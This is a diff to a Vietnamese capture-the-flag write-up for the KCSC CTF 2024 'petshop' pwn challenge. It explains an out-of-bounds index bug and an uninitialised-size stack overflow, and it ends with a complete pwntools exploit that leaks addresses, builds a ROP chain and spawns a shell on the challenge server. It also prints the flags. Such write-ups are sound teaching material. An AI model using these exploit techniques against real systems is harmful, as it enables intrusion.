@@ -3,7 +3,7 @@ title: "KCSC CTF 2024"
 date: 2024-11-03
 draft: false
 description: "Solutions for some challenges in KCSC CTF 2024"
-tags: ["2024", "KCSC CTF", "Rev"]
+tags: ["2024", "KCSC CTF", "Rev", "Pwn"]
 categories: ["CTF Writeups"]
 lightgallery: true
 toc:
@@ -465,7 +465,7 @@ log.info(f"libc leak = {hex(libc_leak)}")
 log.info(f"libc base = {hex(libc_base)}")
 ```
 
-#### Stack Buffer Overflow 
+### Bug Stack Buffer Overflow 
 
 Về cơ bản, chương trình không có bug BOF. Nhưng chúng ta đang có một số thứ để có thể trigger được bug này. 
 - Chức năng **`logout`** cho nhập feedback có kích thước tối đa 256 byte. 
@@ -607,3 +607,419 @@ Flag thu được là **`KCSC{st1ll_buff3r_0v3rfl0w_wh3n_h4s_c4n4ry?!?}`**
 {{< /admonition >}}
 
 **Solution**
+
+### Overview 
+
+Chương trình có 4 lựa chọn:
+- buy
+- sell
+- info 
+- exit 
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+    char s[32]; // [rsp+0h] [rbp-20h] BYREF
+
+    init(argc, argv, envp);
+    puts("Seller --> Welcome to our pet shop!\n");
+    do
+    {
+        puts("Seller --> How may I help you?");
+        printf("You    --> ");
+        fgets(s, 0x20, stdin);
+        if ( !strncmp(s, "buy ", 4uLL) )
+        {
+            buy((__int64)&s[4]);
+        }
+
+        else if ( !strncmp(s, "sell ", 5uLL) )
+        {
+            sell(&s[5]);
+        }
+
+        else if ( !strncmp(s, "info ", 5uLL) )
+        {
+            info(&s[5]);
+        }
+
+        puts(&byte_2298);
+    }
+    while ( strncmp(s, "exit", 4uLL) );
+
+    puts("Seller --> Thank you for shopping with us!");
+    return 0;
+}
+```
+
+Tùy vào từng lựa chọn, các hàm sẽ parse input ra thành các giá trị phù hợp để phục vụ cho việc xử lý của mỗi hàm. Sau khi phân tích sơ qua source code, mình đã tạo một struct **`pet_struct`** như sau: 
+```
+00000000 pet_struct struc ; (sizeof=0x10, mappedto_18)
+00000000 type    dq ?   ; offset
+00000008 name    dq ?   ; offset
+00000010 pet_struct ends
+```
+
+#### Hàm **`buy`**
+
+```c
+int __fastcall buy(char *a1)
+{
+    int v1; // ebx
+    pet_struct **v2; // rax
+    int v3; // eax
+    pet_struct *v4; // rbx
+    int pet_idx; // [rsp+1Ch] [rbp-424h] BYREF
+    char s[1037]; // [rsp+20h] [rbp-420h] BYREF
+    char pet_type[19]; // [rsp+42Dh] [rbp-13h] BYREF
+
+    memset(s, 0, 0x400uLL);
+    if ( (unsigned int)__isoc99_sscanf(a1, "%3s %d", pet_type, &pet_idx) != 2 )
+    {
+        goto LABEL_x52C;
+    }
+
+    --pet_idx;
+    v1 = pet_count;
+    pet_list[v1] = (pet_struct *)malloc(0x10uLL);
+    if ( strncmp(pet_type, "cat", 3uLL) )
+    {
+        if ( strncmp(pet_type, "dog", 3uLL) )
+        {
+            puts("We only have cats and dogs!");
+            v2 = pet_list;
+            pet_list[pet_count] = 0LL;
+            return (int)v2;
+        }
+
+        if ( pet_idx > 3 )
+        {
+            puts("Invalid type of dog!");
+            v2 = pet_list;
+            pet_list[pet_count] = 0LL;
+            return (int)v2;
+        }
+
+        pet_list[pet_count]->type = dogs[pet_idx];
+        goto LABEL_x4BD;
+    }
+
+    if ( pet_idx <= 3 )                         // OOB
+    {
+        pet_list[pet_count]->type = cats[pet_idx];
+
+LABEL_x4BD:
+        puts("Seller --> What is your pet's name?");
+        printf("You    --> ");
+        fgets(s, 1024, stdin);
+        v3 = pet_count++;
+        v4 = pet_list[v3];
+        v4->name = strdup(s);
+
+LABEL_x52C:
+        LODWORD(v2) = puts("Seller --> It's fun to have pet in your house!");
+        return (int)v2;
+    }
+
+    puts("Invalid type of cat!");
+    v2 = pet_list;
+    pet_list[pet_count] = 0LL;
+    return (int)v2;
+}
+```
+
+Tóm tắt hàm **`buy`** như sau: 
+- Parse input theo cấu trúc **`buy | pet_type | pet_type_index`**
+- Cho mua một trong hai loại pet: **`dog`** / **`cat`**
+- Mỗi loại pet có 4 kiểu 
+- Cho phép nhập tên pet tối đa 1024 byte
+
+#### Hàm **`sell`**
+
+```c
+int __fastcall sell(char *a1)
+{
+    int reason_size; // [rsp+18h] [rbp-208h] BYREF
+    unsigned int pet_list_idx; // [rsp+1Ch] [rbp-204h] BYREF
+    char reason[512]; // [rsp+20h] [rbp-200h] BYREF
+
+    memset(reason, 0, sizeof(reason));
+    if ( (unsigned int)__isoc99_sscanf(a1, "%d", &pet_list_idx) != 1 || pet_list_idx > 7 || !pet_list[pet_list_idx] )
+    {
+        return puts("Seller --> There are no pet in that index!");
+    }
+
+    pet_list[pet_list_idx] = 0LL;
+    puts("Seller --> Nooooo, why you want to sell your pet?");
+    puts("Seller --> How many characters in your reason?");
+    printf("You    --> ");
+    if ( (unsigned int)__isoc99_scanf("%d", &reason_size) == 1 && (reason_size <= 0 || reason_size > 511) )
+    {
+        return puts("Invalid size!");
+    }
+
+    getchar();
+    puts("Seller --> Your reason?");
+    printf("You    --> ");
+    fgets(reason, reason_size, stdin);
+    return puts("Seller --> That seems reasonable!");
+}
+```
+
+Tóm tắt hàm **`sell`** như sau: 
+- Parse input theo cấu trúc **`sell | pet_list_index`**
+- Cho bán một trong hai loại: **`dog`** / **`cat`**
+- Cho nhập **`reason`** với kích thước **`reason_size`** nằm trong khoảng [1, 511]
+
+#### Hàm **`info`**
+
+```c
+int __fastcall info(const char *a1)
+{
+    pet_struct *v1; // rax
+    int k; // [rsp+14h] [rbp-Ch]
+    int j; // [rsp+18h] [rbp-8h]
+    int i; // [rsp+1Ch] [rbp-4h]
+
+    if ( !strncmp(a1, "cat", 3uLL) )
+    {
+        LODWORD(v1) = puts("In here we have:");
+        for ( i = 0; i <= 3; ++i )
+        {
+            LODWORD(v1) = printf("%d. %s\n", (unsigned int)(i + 1), cats[i]);
+        }
+    }
+
+    else if ( !strncmp(a1, "dog", 3uLL) )
+    {
+        LODWORD(v1) = puts("In here we have:");
+        for ( j = 0; j <= 3; ++j )
+        {
+            LODWORD(v1) = printf("%d. %s\n", (unsigned int)(j + 1), dogs[j]);
+        }
+    }
+    else
+    {
+        LODWORD(v1) = strncmp(a1, "mine", 4uLL);
+        if ( !(_DWORD)v1 )
+        {
+            LODWORD(v1) = puts("Your pets:");
+            for ( k = 0; k <= 7; ++k )
+            {
+                v1 = pet_list[k];
+                if ( v1 )
+                {
+                    printf("%d. %s\n", (unsigned int)(k + 1), pet_list[k]->type);
+                    LODWORD(v1) = printf("Name: %s\n", pet_list[k]->name);
+                }
+            }
+        }
+    }
+
+    return (int)v1;
+}
+```
+
+Tóm tắt hàm **`info`** như sau: 
+- Parse input theo cấu trúc **`info | option`**
+- Có 3 **`option`** để lựa chọn:
+  - **`dog`**
+  - **`cat`**
+  - **`mine`**: In ra toàn bộ thông tin **`pet_list`** của mình
+
+### Bug Out-off-Bound 
+
+Ở hàm **`buy`**, ta nhận thấy rằng **`pet_type_idx`** có thể nhận giá trị âm, từ đó gây nên bug OOB. 
+
+```c
+int __fastcall buy(char *a1)
+{
+    int pet_type_idx; // [rsp+1Ch] [rbp-424h] BYREF
+    if ( (unsigned int)__isoc99_sscanf(a1, "%3s %d", pet_type, &pet_type_idx) != 2 )
+        goto LABEL_x52C;
+
+    --pet_type_idx;
+
+    if ( pet_type_idx <= 3 )                    // OOB
+        pet_list[pet_count]->type = cats[pet_type_idx];
+}
+``` 
+
+Tận dụng chức năng in ra toàn bộ thông tin **`pet_list`** của hàm **`info`**. Ta sẽ leak được các giá trị của binary và libc. 
+
+#### Leak binary
+Mua một bé mèo với cú pháp **`buy cat 1`**. Do idx sẽ bị trừ đi một, vậy nên em mèo của ta sẽ có tên ở địa chỉ **`cats[0]`**. 
+
+<img src="./10.png">
+
+Nhìn xung quanh các giá trị lân cận, ta thấy có giá trị **`0x0000555555558008`** là địa chỉ binary. Ta hoàn toàn leak được giá trị đó với **`idx = -2`**.  
+
+```python
+buy("cat", -2, cyclic(1020)) 
+info("mine")
+
+ru(b"1. ")
+
+binary_leak = u64(p.recv(6) + b"\x00\x00")
+binary_base = binary_leak - 0x4008
+log.info(f"binary leak = {hex(binary_leak)}")
+log.info(f"binary base = {hex(binary_base)}")
+```
+
+#### Leak libc (Invisible)
+
+Sau khi search trong memory, mình không thấy có địa chỉ nào phù hợp để leak ra libc. Vì vậy mình tạm hoãn công việc này tại đây. 
+
+### Bug Stack Buffer Overflow
+
+Với việc cho nhập **`pet_name`** tối đa tới tận 1024 byte. Mình thoáng nghĩ có điều gì không ổn tại đây. Mình dùng **`cyclic`** tạo thử 1020 byte để xem input này có ảnh hưởng gì tới các hàm khác không. 
+
+Thử vào hàm **`sell`**, đi tới hàm nhập **`reason_size`** thì ta thấy **`reason_size`** đang có giá trị rác **`jaaf`** rất giống trong **`input`** tạo bởi **`cyclic`**. 
+
+<img src="./11.png">
+
+Từ đây, ta hoàn toàn điều khiển được **`reason_size`** và trigger được bug BOF. Nguyên nhân dẫn tới lỗi này là **`reason_size`** không được initialize, vậy nên nó có thể nhận giá trị rác từ input nào đó. 
+
+```c
+int __fastcall sell(char *a1)
+{
+    int reason_size; // [rsp+18h] [rbp-208h] BYREF
+    char reason[512]; // [rsp+20h] [rbp-200h] BYREF
+
+    if ( (unsigned int)__isoc99_scanf("%d", &reason_size) == 1 && (reason_size <= 0 || reason_size > 511) )
+    {
+        return puts("Invalid size!");
+    }
+
+    fgets(reason, reason_size, stdin);
+}
+```
+
+Chưa hết, ta phải bypass được điều kiện check ở trên. Có một trick với hàm **`scanf`** là nếu như ta nhập input không đúng với định dạng fmt thì hàm sẽ trả về 0 và không làm thay đổi giá trị của đối số. 
+
+Vậy input mình nhập vào đơn giản chỉ là **`-`** sẽ bypass được đoạn check ở trên. 
+
+```python
+def sell(pet_list_idx, reason): 
+    payload = ("sell " + str(pet_list_idx)).encode("utf8")
+    sla(b"You    --> ", payload)
+    sla(b"You    --> ", b"-")
+    sla(b"You    --> ", reason)
+```
+
+### Build ropchain to leak libc 
+
+Sau khi dựa trên stack, ta tính được offset để overwrite retaddr là 0x208 byte. Tới đây thì chúng ta dễ dàng build ropchain để leak libc.  
+
+```python
+poprdi   = binary_base + 0x1a13
+ret      = poprdi + 1
+putsgot  = binary_base + exe.got["puts"]
+putsplt  = binary_base + exe.plt["puts"]
+backaddr = binary_base + exe.symbols["main"]
+payload1 = flat(b"A" * 0x208, poprdi, putsgot, putsplt, backaddr)
+
+sell(0, payload1)
+
+ru(b"reasonable!\n")
+
+libc_leak = u64(p.recv(6) + b"\x00\x00")
+libc_base = libc_leak - libc.symbols["puts"]
+log.info(f"libc leak = {hex(libc_leak)}")
+log.info(f"libc base = {hex(libc_base)}")
+```
+
+### Get shell 
+
+Hoàn thiện exploit, có được shell của thử thách. Có một vấn đề nhỏ mà chúng ta cần chú ý ở hàm **`sell`** là 
+```c
+ if ( (unsigned int)__isoc99_sscanf(a1, "%d", &pet_list_idx) != 1 || pet_list_idx > 7 || !pet_list[pet_list_idx] )
+    {
+        return puts("Seller --> There are no pet in that index!");
+    }
+```
+Nếu chúng ta chỉ tạo 1 con pet thì sau lần sell thứ nhất **`pet_list`** sẽ rỗng. Vậy để hợp lệ hóa cho bước kiểm tra này, mình sẽ tạo thêm 1 con pet nữa.  
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./petshop_patched")
+libc = ELF("./libc-2.31.so")
+ld = ELF("./ld-2.31.so")
+
+context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)
+
+# p = process(exe.path)
+p = remote("103.163.24.78", 10001)
+
+sl  = p.sendline
+sa  = p.sendafter
+sla = p.sendlineafter
+rl  = p.recvline
+ru  = p.recvuntil
+
+def debug():
+    gdb.attach(p, gdbscript = """
+        b *main+82
+        b *sell+367
+        continue
+    """)
+    pause() 
+
+# debug()
+
+def buy(pet_type, pet_type_idx, pet_name): 
+    payload = ("buy " + pet_type + " " + str(pet_type_idx)).encode("utf8")
+    sla(b"You    --> ", payload)
+    sla(b"You    --> ", pet_name)
+
+def sell(pet_list_idx, reason): 
+    payload = ("sell " + str(pet_list_idx)).encode("utf8")
+    sla(b"You    --> ", payload)
+    sla(b"You    --> ", b"-")
+    sla(b"You    --> ", reason)
+
+def info(option):
+    payload = ("info " + option).encode("utf8")
+    sla(b"You    --> ", payload)
+
+buy("cat", -2, cyclic(536) + p32(0x300)) 
+info("mine")
+
+ru(b"1. ")
+
+binary_leak = u64(p.recv(6) + b"\x00\x00")
+binary_base = binary_leak - 0x4008
+log.info(f"binary leak = {hex(binary_leak)}")
+log.info(f"binary base = {hex(binary_base)}")
+
+poprdi   = binary_base + 0x1a13
+ret      = poprdi + 1
+putsgot  = binary_base + exe.got["puts"]
+putsplt  = binary_base + exe.plt["puts"]
+backaddr = binary_base + exe.symbols["main"]
+payload1 = flat(b"A" * 0x208, poprdi, putsgot, putsplt, backaddr)
+
+sell(0, payload1)
+
+ru(b"reasonable!\n")
+
+libc_leak = u64(p.recv(6) + b"\x00\x00")
+libc_base = libc_leak - libc.symbols["puts"]
+log.info(f"libc leak = {hex(libc_leak)}")
+log.info(f"libc base = {hex(libc_base)}")
+
+# create fake pet to validate pet deletion
+buy("cat", -2, cyclic(536) + p32(0x300)) 
+
+binsh  = libc_base + next(libc.search(b"/bin/sh"))
+system = libc_base + libc.symbols["system"]
+payload2 = flat(b"B" * 0x208, ret, poprdi, binsh, system)
+
+sell(1, payload2)
+
+p.interactive() 
+```
+Flag thu được là **`KCSC{0h_n0_0ur_p3t_h4s_bug?!????????????????????}`**
